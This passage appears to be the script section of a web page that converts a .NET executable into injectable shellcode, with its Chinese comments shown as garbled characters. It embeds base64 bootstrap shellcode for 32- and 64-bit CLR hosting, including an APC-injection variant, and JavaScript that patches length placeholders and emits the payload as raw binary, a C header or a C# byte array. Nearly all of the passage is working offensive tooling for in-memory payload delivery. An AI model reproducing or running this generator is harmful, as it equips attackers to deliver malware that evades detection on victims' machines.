UAAAAg8ZwiQZqAGSLNRQAAACLdnBWagBqAGoAagBkizUUAAAAg8ZsixZSiwr/kZQAAACFwHUnaI4YBwBoiE4NAOgB+///aABAAABoAAMAAGSLNRgAAAD/dhT/0OsAw40YgJKODmdIswx/qDiE6N6e2zLTs7klQYIHoUiE9TIW0tE5vS+6akiJsLSwy0ZokSJnL8s6q9IRnEAAwE+jCj4jZy/LOqvSEZxAAMBPowo+3Jb2BSkrYzati8Q4nPKnEwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhlcNAPqLNABCMQ4AjhgHAHJUawAQU9Uaei61Bno21hpYrVoDmK9aAxbJngEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE1TQ09SRUUuZGxsAE9sZUF1dDMyLmRsbAB2ADQALgAwAC4AMwAwADMAMQA5AAAAYQBYAGIAcABPAHoAegBGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==',
            'sc-64-clrnd': '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'
        };
        // ============================================


        // ÊãñÊãΩÂäüËÉΩÂàùÂßãÂåñ
        document.addEventListener('DOMContentLoaded', function() {
            const dropZone = document.getElementById('dropZone');
            const fileInput = document.getElementById('assemblyFile');
            const dropLink = dropZone.querySelector('.drop-link');

            // ÁÇπÂáªÈÄâÊã©Êñá‰ª∂
            dropZone.addEventListener('click', function(e) {
                const fileInfo = dropZone.querySelector('.file-info');
                if (e.target !== dropLink && e.target !== fileInfo && 
                    (!fileInfo || fileInfo.style.display === 'none')) {
                    fileInput.click();
                }
            });

            dropLink.addEventListener('click', function(e) {
                e.stopPropagation();
                fileInput.click();
            });

            // Êñá‰ª∂ÈÄâÊã©ÂèòÂåñ
            fileInput.addEventListener('change', function(e) {
                if (e.target.files && e.target.files.length > 0) {
                    handleFileSelect(e.target.files[0]);
                }
            });

            // ÊãñÊãΩ‰∫ã‰ª∂
            dropZone.addEventListener('dragover', function(e) {
                e.preventDefault();
                e.stopPropagation();
                dropZone.classList.add('drag-over');
            });

            dropZone.addEventListener('dragleave', function(e) {
                e.preventDefault();
                e.stopPropagation();
                dropZone.classList.remove('drag-over');
            });

            dropZone.addEventListener('drop', function(e) {
                e.preventDefault();
                e.stopPropagation();
                dropZone.classList.remove('drag-over');

                const files = e.dataTransfer.files;
                if (files && files.length > 0) {
                    const file = files[0];
                    if (file.name.endsWith('.exe')) {
                        fileInput.files = files;
                        handleFileSelect(file);
                    } else {
                        alert('ËØ∑ÈÄâÊã© .exe Êñá‰ª∂');
                    }
                }
            });
        });

        function handleFileSelect(file) {
            const fileInfo = document.getElementById('fileInfo');
            const fileName = document.getElementById('fileName');
            const fileSize = document.getElementById('fileSize');
            const dropZoneContent = document.querySelector('.drop-zone-content');

            fileName.textContent = file.name;
            fileSize.textContent = formatFileSize(file.size);
            fileInfo.style.display = 'flex';
            dropZoneContent.querySelector('.drop-text').style.display = 'none';
            dropZoneContent.querySelector('.drop-hint').style.display = 'none';
            dropZoneContent.querySelector('.drop-icon').style.display = 'none';
        }

        function removeFile() {
            const fileInput = document.getElementById('assemblyFile');
            const fileInfo = document.getElementById('fileInfo');
            const dropZoneContent = document.querySelector('.drop-zone-content');

            fileInput.value = '';
            fileInfo.style.display = 'none';
            dropZoneContent.querySelector('.drop-text').style.display = 'block';
            dropZoneContent.querySelector('.drop-hint').style.display = 'block';
            dropZoneContent.querySelector('.drop-icon').style.display = 'block';
        }

        function formatFileSize(bytes) {
            if (bytes === 0) return '0 Bytes';
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
        }

        function base64ToBytes(base64) {
            try {
                const binaryString = atob(base64.replace(/\s/g, ''));
                const bytes = new Uint8Array(binaryString.length);
                for (let i = 0; i < binaryString.length; i++) {
                    bytes[i] = binaryString.charCodeAt(i);
                }
                return bytes;
            } catch (e) {
                throw new Error('Base64 Ëß£Á†ÅÂ§±Ë¥•: ' + e.message);
            }
        }

        function bytesToBase64(bytes) {
            let binary = '';
            for (let i = 0; i < bytes.length; i++) {
                binary += String.fromCharCode(bytes[i]);
            }
            return btoa(binary);
        }

        function findPlaceholder(bytes) {
            const placeholder = new Uint8Array([0x41, 0x41, 0x41, 0x41]); // "AAAA"
            for (let i = 0; i <= bytes.length - 4; i++) {
                if (bytes[i] === placeholder[0] &&
                    bytes[i + 1] === placeholder[1] &&
                    bytes[i + 2] === placeholder[2] &&
                    bytes[i + 3] === placeholder[3]) {
                    return i;
                }
            }
            return -1;
        }

        function packLittleEndian(value) {
            return new Uint8Array([
                value & 0xFF,
                (value >> 8) & 0xFF,
                (value >> 16) & 0xFF,
                (value >> 24) & 0xFF
            ]);
        }

        function dumpC(shellcode) {
            let result = '';
            for (let i = 0; i < shellcode.length; i++) {
                const pos = i % 16;
                if (pos === 0) {
                    result += '"';
                }
                result += '\\x' + shellcode[i].toString(16).padStart(2, '0');
                if (i === shellcode.length - 1) {
                    result += '";\n';
                } else if (pos === 15) {
                    result += '"\n';
                }
            }
            return result;
        }

        function dumpNet(shellcode) {
            let result = 'byte[] shellcode={';
            for (let i = 0; i < shellcode.length; i++) {
                if (i % 16 === 0) {
                    result += '\n0x' + shellcode[i].toString(16).padStart(2, '0');
                } else {
                    result += '0x' + shellcode[i].toString(16).padStart(2, '0');
                }
                if (i < shellcode.length - 1) {
                    result += ',';
                }
            }
            result += '};';
            return result;
        }

        function getBootstrapBase64() {
            const platform = document.getElementById('platform').value;
            const useApc = document.getElementById('useApc').checked;
            const newDomain = document.getElementById('newDomain').checked;

            let base64 = '';
            if (useApc && !newDomain) {
                if (platform === '32') {
                    base64 = SHELLCODE_BASE64['sc-32-clr-apc'].trim();
                } else {
                    throw new Error('64‰ΩçÂπ≥Âè∞ÊöÇ‰∏çÊîØÊåÅ APC Ê®°Âºè');
                }
            } else if (useApc && newDomain && platform === '32') {
                base64 = SHELLCODE_BASE64['sc-32-clrnd-apc'].trim();
            } else if (newDomain) {
                if (platform === '32') {
                    base64 = SHELLCODE_BASE64['sc-32-clrnd'].trim();
                } else {
                    base64 = SHELLCODE_BASE64['sc-64-clrnd'].trim();
                }
            } else {
                if (platform === '32') {
                    base64 = SHELLCODE_BASE64['sc-32-clr'].trim();
                } else {
                    base64 = SHELLCODE_BASE64['sc-64-clr'].trim();
                }
            }
            return base64;
        }

        function generateShellcode() {
            const generateBtn = document.getElementById('generateBtn');

            try {
                generateBtn.disabled = true;
                generateBtn.textContent = 'Ê≠£Âú®ÁîüÊàê...';

                // Ëé∑ÂèñÁ®ãÂ∫èÈõÜÊñá‰ª∂
                const fileInput = document.getElementById('assemblyFile');
                if (!fileInput.files || fileInput.files.length === 0) {
                    throw new Error('ËØ∑ÈÄâÊã©Á®ãÂ∫èÈõÜÊñá‰ª∂');
                }

                const assemblyFile = fileInput.files[0];
                const reader = new FileReader();

                reader.onload = function(e) {
                    try {
                        const assemblyBytes = new Uint8Array(e.target.result);
                        const platform = document.getElementById('platform').value;
                        const outputFormat = document.getElementById('outputFormat').value;

                        // Ëé∑Âèñ bootstrap
                        const bootstrapBase64 = getBootstrapBase64();
                        let bootstrapBytes = base64ToBytes(bootstrapBase64);

                        // Êü•ÊâæÂç†‰ΩçÁ¨¶
                        const firstSab = findPlaceholder(bootstrapBytes);
                        if (firstSab === -1) {
                            throw new Error('Âú® bootstrap ‰∏≠Êú™ÊâæÂà∞ÈïøÂ∫¶Âç†‰ΩçÁ¨¶ (Á¨¨‰∏Ä‰∏™ AAAA)');
                        }

                        const secondMemcpy = findPlaceholder(bootstrapBytes.slice(firstSab + 1));
                        if (secondMemcpy === -1) {
                            throw new Error('Âú® bootstrap ‰∏≠Êú™ÊâæÂà∞ÈïøÂ∫¶Âç†‰ΩçÁ¨¶ (Á¨¨‰∫å‰∏™ AAAA)');
                        }

                        const assemblyLen = packLittleEndian(assemblyBytes.length);

                        // ÊõøÊç¢Âç†‰ΩçÁ¨¶ÔºàÂéªÊéâÊúÄÂêé‰∏Ä‰∏™Â≠óËäÇÔºå‰∏éPython‰ª£Á†Å‰øùÊåÅ‰∏ÄËá¥Ôºâ
                        const bootstrapArray = Array.from(bootstrapBytes.slice(0, -1));
                        bootstrapArray[firstSab] = assemblyLen[0];
                        bootstrapArray[firstSab + 1] = assemblyLen[1];
                        bootstrapArray[firstSab + 2] = assemblyLen[2];
                        bootstrapArray[firstSab + 3] = assemblyLen[3];

                        const secondPos = firstSab + 1 + secondMemcpy;
                        bootstrapArray[secondPos] = assemblyLen[0];
                        bootstrapArray[secondPos + 1] = assemblyLen[1];
                        bootstrapArray[secondPos + 2] = assemblyLen[2];
                        bootstrapArray[secondPos + 3] = assemblyLen[3];

                        // ÊãºÊé• shellcode
                        const assembled = new Uint8Array(bootstrapArray.length + assemblyBytes.length);
                        assembled.set(bootstrapArray);
                        assembled.set(assemblyBytes, bootstrapArray.length);

                        // ÁîüÊàêËæìÂá∫Âπ∂Áõ¥Êé•‰∏ãËΩΩ
                        let downloadData = null;
                        let mimeType = 'application/octet-stream';
                        let extension = '.bin';

                        if (outputFormat === 'c') {
                            downloadData = dumpC(assembled);
                            mimeType = 'text/plain';
                            extension = '.h';
                        } else if (outputFormat === 'net') {
                            downloadData = dumpNet(assembled);
                            mimeType = 'text/plain';
                            extension = '.cs';
                        } else {
                            downloadData = assembled;
                            mimeType = 'application/octet-stream';
                            extension = '.bin';
                        }

                        // Áõ¥Êé•‰∏ãËΩΩ
                        const fileName = assemblyFile.name.replace(/\.[^/.]+$/, '') + extension;
                        downloadFile(downloadData, fileName, mimeType);

                    } catch (error) {
                        alert('ÁîüÊàêÂ§±Ë¥•: ' + error.message);
                    } finally {
                        generateBtn.disabled = false;
                        generateBtn.textContent = 'üöÄ ÁîüÊàê Shellcode';
                    }
                };

                reader.readAsArrayBuffer(assemblyFile);

            } catch (error) {
                alert('ÈîôËØØ: ' + error.message);
                generateBtn.disabled = false;
                generateBtn.textContent = 'üöÄ ÁîüÊàê Shellcode';
            }
        }

        function downloadFile(data, fileName, mimeType) {
            let blob;
            if (data instanceof Uint8Array) {
                blob = new Blob([data], { type: mimeType });
            } else {
                blob = new Blob([data], { type: mimeType });
            }

            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = fileName;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }
    </script>
</body>
</html>


